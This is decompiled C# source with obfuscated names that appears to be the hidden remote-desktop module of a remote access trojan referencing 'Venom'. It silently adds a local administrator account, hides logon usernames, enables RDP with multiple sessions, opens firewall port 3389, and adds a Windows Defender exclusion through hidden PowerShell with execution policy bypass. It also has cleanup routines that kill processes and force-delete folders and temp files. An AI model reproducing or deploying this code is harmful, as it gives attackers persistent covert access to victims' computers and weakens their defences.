using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using Microsoft.Win32;

public class GClass40
{
	public static bool smethod_0(string name)
	{
		smethod_5();
		Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("dontdisplaylastusername", 1);
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != null)
		{
			if (text.ToLower().Contains("command completed successfully."))
			{
				processStartInfo = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				Process process2 = new Process();
				process2.StartInfo = processStartInfo;
				process2.Start();
				text = process2.StandardOutput.ReadToEnd();
				process2.WaitForExit();
				if (text != null && text.ToLower().Contains("command completed successfully."))
				{
					return true;
				}
				return false;
			}
			return false;
		}
		return false;
	}

	public static void smethod_1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		new ServiceController("TermService").Stop();
		GClass60.smethod_0("Venom");
		smethod_4();
		smethod_3();
		string text = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell " + text + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		string text2 = "C:\\Program Files\\RDP Wrapper";
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s " + text2 + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		string text3 = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s " + text3 + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Directory.Delete(text2, recursive: true);
		smethod_2();
		File.SetAttributes(text2, FileAttributes.Normal);
		File.Delete(text2);
	}

	public static void smethod_2()
	{
		if (File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
		{
			try
			{
				File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
			}
			catch (IOException ex)
			{
				Console.WriteLine(ex.Message);
				return;
			}
		}
		FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
		try
		{
			fileInfo.Delete();
		}
		catch (IOException ex2)
		{
			Console.WriteLine(ex2.Message);
		}
		try
		{
			Directory.Delete("C:\\Program Files\\RDP Wrapper");
		}
		catch (IOException ex3)
		{
			Console.WriteLine(ex3.Message);
		}
		if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
		{
			try
			{
				Directory.Delete("C:\\Program Files\\RDP Wrapper", recursive: true);
			}
			catch (IOException ex4)
			{
				Console.WriteLine(ex4.Message);
			}
		}
		DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
		try
		{
			directoryInfo.Delete(recursive: true);
		}
		catch (IOException ex5)
		{
			Console.WriteLine(ex5.Message);
		}
		FileSecurity accessControl = File.GetAccessControl("C:\\Program Files\\RDP Wrapper");
		SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
		accessControl.SetOwner(user);
		accessControl.SetAccessRule(new FileSystemAccessRule(user, FileSystemRights.FullControl, AccessControlType.Allow));
		File.SetAccessControl("C:\\Program Files\\RDP Wrapper", accessControl);
		File.Delete("C:\\Program Files\\RDP Wrapper");
	}

	public static void smethod_3()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static bool smethod_4()
	{
		string value = "cmd";
		string value2 = "conhost";
		string value3 = "installrdp";
		string value4 = "rdpinstall";
		string value5 = "updaterdp";
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.MainWindowTitle.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			processes = Process.GetProcesses();
			num = 0;
			Process process2;
			while (true)
			{
				if (num < processes.Length)
				{
					process2 = processes[num];
					if (process2.MainWindowTitle.Contains(value5))
					{
						break;
					}
					num++;
					continue;
				}
				processes = Process.GetProcesses();
				num = 0;
				Process process3;
				while (true)
				{
					if (num < processes.Length)
					{
						process3 = processes[num];
						if (process3.MainWindowTitle.Contains(value4))
						{
							break;
						}
						num++;
						continue;
					}
					processes = Process.GetProcesses();
					num = 0;
					Process process4;
					while (true)
					{
						if (num < processes.Length)
						{
							process4 = processes[num];
							if (process4.MainWindowTitle.Contains(value3))
							{
								break;
							}
							num++;
							continue;
						}
						processes = Process.GetProcesses();
						num = 0;
						Process process5;
						while (true)
						{
							if (num < processes.Length)
							{
								process5 = processes[num];
								if (process5.MainWindowTitle.Contains(value2))
								{
									break;
								}
								num++;
								continue;
							}
							return false;
						}
						process5.Kill();
						return true;
					}
					process4.Kill();
					return true;
				}
				process3.Kill();
				return true;
			}
			process2.Kill();
			return true;
		}
		process.Kill();
		return true;
	}

	public static void smethod_5()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
		if (registryKey == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey.SetValue("fDenyTSConnections", 0);
		}
		else
		{
			registryKey.SetValue("fDenyTSConnections", 0);
		}
		registryKey.Flush();
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
		if (registryKey2 == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
			registryKey2.SetValue("UserAuthentication", 1);
		}
		else
		{
			registryKey2.SetValue("UserAuthentication", 1);
		}
		registryKey2.Flush();
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
		if (registryKey3 == null)
		{
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
			registryKey3.SetValue("fSingleSessionPerUser", 0);
		}
		else
		{
			registryKey3.SetValue("fSingleSessionPerUser", 0);
		}
		registryKey3.Flush();
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
		if (registryKey4 == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey4.SetValue("fSingleSessionPerUser", 0);
		}
		else
		{
			registryKey4.SetValue("fSingleSessionPerUser", 0);
		}
		registryKey4.Flush();
		try
		{
			RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
			if (registryKey5 != null && registryKey5.GetValue("Durios") != null)
			{
				registryKey5.SetValue("Durios", "0");
			}
			Console.WriteLine("Durios desactivated");
		}
		catch (Exception)
		{
			smethod_6("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Durios -PropertyType DWord -Value 0 -Force");
		}
		RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
		if (registryKey6 == null)
		{
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
			registryKey6.SetValue("Durios", 0);
		}
		else
		{
			registryKey6.SetValue("Durios", 0);
		}
		registryKey6.Flush();
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	private static void smethod_6(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}
}
